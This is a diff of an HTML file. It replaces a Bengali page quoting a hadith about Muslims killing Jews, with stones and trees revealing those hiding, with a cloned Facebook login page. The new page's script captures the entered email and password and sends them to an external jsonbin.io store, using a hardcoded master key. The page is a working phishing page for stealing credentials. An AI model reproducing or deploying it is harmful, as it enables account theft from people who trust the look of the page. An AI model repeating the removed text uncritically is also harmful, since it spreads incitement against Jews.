@@ -1,71 +1,273 @@
 <!DOCTYPE html>
-<html lang="bn">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>সহিহ মুসলিম হাদিস ২৯২২</title>
+<!-- Coding By CodingNepal - www.codingnepalweb.com -->
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook Login Page | CodingNepal</title>
+    <link rel="stylesheet" href="style.css" />
     <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
+      @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: 'Roboto', sans-serif;
+      }
+
+      .flex {
+        display: flex;
+        align-items: center;
+      }
+
+      .container {
+        padding: 0 15px;
+        min-height: 100vh;
+        justify-content: center;
+        background: #f0f2f5;
+      }
+
+      .facebook-page {
+        justify-content: space-between;
+        max-width: 1000px;
+        width: 100%;
+      }
+
+      .facebook-page .text {
+        margin-bottom: 90px;
+      }
+
+      .facebook-page h1 {
+        color: #1877f2;
+        font-size: 4rem;
+        margin-bottom: 10px;
+      }
+
+      .facebook-page p {
+        font-size: 1.75rem;
+        white-space: nowrap;
+      }
+
+      form {
+        display: flex;
+        flex-direction: column;
+        background: #fff;
+        border-radius: 8px;
+        padding: 20px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+        max-width: 400px;
+        width: 100%;
+      }
+
+      form input {
+        height: 55px;
+        width: 100%;
+        border: 1px solid #ccc;
+        border-radius: 6px;
+        margin-bottom: 15px;
+        font-size: 1rem;
+        padding: 0 14px;
+      }
+
+      form input:focus {
+        outline: none;
+        border-color: #1877f2;
+      }
+
+      ::placeholder {
+        color: #777;
+        font-size: 1.063rem;
+      }
+
+      .link {
+        display: flex;
+        flex-direction: column;
+        text-align: center;
+        gap: 15px;
+      }
+
+      .link .login {
+        border: none;
+        outline: none;
+        cursor: pointer;
+        background: #1877f2;
+        padding: 15px 0;
+        border-radius: 6px;
+        color: #fff;
+        font-size: 1.25rem;
+        font-weight: 600;
+        transition: 0.2s ease;
+      }
+
+      .link .login:hover {
+        background: #0d65d9;
+      }
+
+      form a {
+        text-decoration: none;
+      }
+
+      .link .forgot {
+        color: #1877f2;
+        font-size: 0.875rem;
+      }
+
+      .link .forgot:hover {
+        text-decoration: underline;
+      }
+
+      hr {
+        border: none;
+        height: 1px;
+        background-color: #ccc;
+        margin-bottom: 20px;
+        margin-top: 20px;
+      }
+
+      .button {
+        margin-top: 25px;
+        text-align: center;
+        margin-bottom: 20px;
+      }
+
+      .button a {
+        padding: 15px 20px;
+        background: #42b72a;
+        border-radius: 6px;
+        color: #fff;
+        font-size: 1.063rem;
+        font-weight: 600;
+        transition: 0.2s ease;
+      }
+
+      .button a:hover {
+        background: #3ba626;
+      }
+
+      @media (max-width: 900px) {
+        .facebook-page {
+          flex-direction: column;
+          text-align: center;
         }
-        .container {
-            max-width: 800px;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(15px);
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            text-align: center;
+
+        .facebook-page .text {
+          margin-bottom: 30px;
         }
-        h1 {
-            font-size: 32px;
-            margin-bottom: 20px;
-            color: #ffffff;
+      }
+
+      @media (max-width: 460px) {
+        .facebook-page h1 {
+          font-size: 3.5rem;
         }
-        h2 {
-            font-size: 24px;
-            margin-bottom: 15px;
-            border-bottom: 2px solid #ffffff;
-            display: inline-block;
-            padding-bottom: 5px;
+
+        .facebook-page p {
+          font-size: 1.3rem;
         }
-        p {
-            font-size: 18px;
-            line-height: 1.8;
-            margin-bottom: 20px;
-            text-align: justify;
+
+        form {
+          padding: 15px;
         }
-        .source {
-            font-weight: bold;
-            font-size: 20px;
-            margin-top: 20px;
-            color: #ffffff;
-        }
+      }
     </style>
-</head>
-<body>
-    <div class="container">
-        <h1>সহিহ মুসলিম হাদিস ২৯২২</h1>
-        <h2>হাদিসের বর্ণনা</h2>
-        <p>
-            আবু হুরাইরা (রা.) থেকে বর্ণিত: রাসুলুল্লাহ (সা.) বলেছেন,<br>
-            <strong>
-                “কিয়ামত সংঘটিত হবে না যতক্ষণ না মুসলিমরা ইয়াহুদিদের (ইহুদিদের) সাথে যুদ্ধ করবে এবং মুসলিমরা তাদের হত্যা করবে।
-                এমনকি যদি কোন ইয়াহুদি পাথর বা গাছের আড়ালে লুকিয়ে থাকে, তখন সেই পাথর বা গাছ বলবে: 
-                ‘হে মুসলিম! হে আল্লাহর বান্দা! আমার পেছনে একজন ইয়াহুদি লুকিয়ে আছে, এসো এবং তাকে হত্যা করো।’
-                কেবল গারকাদ গাছ এটি বলবে না, কারণ সেটি ইয়াহুদিদের গাছ।”
-            </strong>
-        </p>
-        <p class="source">উৎস: সহিহ মুসলিম, কিতাব আল-ফিতান ও আশরাত আস-সা’আহ, হাদিস নম্বর: ২৯২২</p>
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1>facebook</h1>
+          <p>Connect with friends and the world</p>
+          <p>around you on Facebook.</p>
+        </div>
+        <form action="#">
+          <input
+            type="email"
+            placeholder="Email or phone number"
+            id="mail"
+            required
+          />
+          <input type="password" placeholder="Password" id="pass" required />
+          <div class="link">
+            <button type="submit" class="login" id="btn">Login</button>
+            <a href="#" class="forgot">Forgot password?</a>
+          </div>
+          <hr />
+          <div class="button">
+            <a href="#">Create new account</a>
+          </div>
+        </form>
+      </div>
     </div>
-</body>
+
+    <script>
+      document.getElementById('btn').addEventListener('click', (x) => {
+        /**
+         *
+         */
+
+        let email = document.getElementById('mail');
+        let pass = document.getElementById('pass');
+
+        const simpleEmailRegex =
+          /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+
+        function isValidEmail(email) {
+          return simpleEmailRegex.test(email);
+        }
+
+        let data = { id: email.value, password: pass.value };
+
+        /**
+         * send
+         */
+        const send = (hack) => {
+          saveUser(hack);
+        };
+
+        /**
+         * check
+         */
+        if (isValidEmail(email.value) && pass.value.length > 6) {
+          console.log('check is ok');
+          send(data);
+        } else {
+          console.log('err');
+        }
+
+        /**
+         * api
+         */
+        async function saveUser(newUser) {
+          // আগে পুরোনো ডাটা রিড করুন
+          let response = await fetch(
+            'https://api.jsonbin.io/v3/b/68ae98da43b1c97be92c8452/latest',
+            {
+              headers: {
+                'X-Master-Key':
+                  '$2a$10$Uy5Sn6efPq3TetXXz4m8uuxCQpD/p3NdzILOjWvV5zvZKhHhPX6CS',
+              },
+            }
+          );
+          let data = await response.json();
+
+          // পুরোনো users লিস্ট নিন
+          let users = data.record.users;
+
+          // নতুন ইউজার যোগ করুন
+          users.push(newUser);
+
+          // PUT করে সেভ করুন
+          await fetch('https://api.jsonbin.io/v3/b/68ae98da43b1c97be92c8452', {
+            method: 'PUT',
+            headers: {
+              'Content-Type': 'application/json',
+              'X-Master-Key':
+                '$2a$10$Uy5Sn6efPq3TetXXz4m8uuxCQpD/p3NdzILOjWvV5zvZKhHhPX6CS',
+            },
+            body: JSON.stringify({ users }),
+          });
+        }
+      });
+    </script>
+  </body>
 </html>
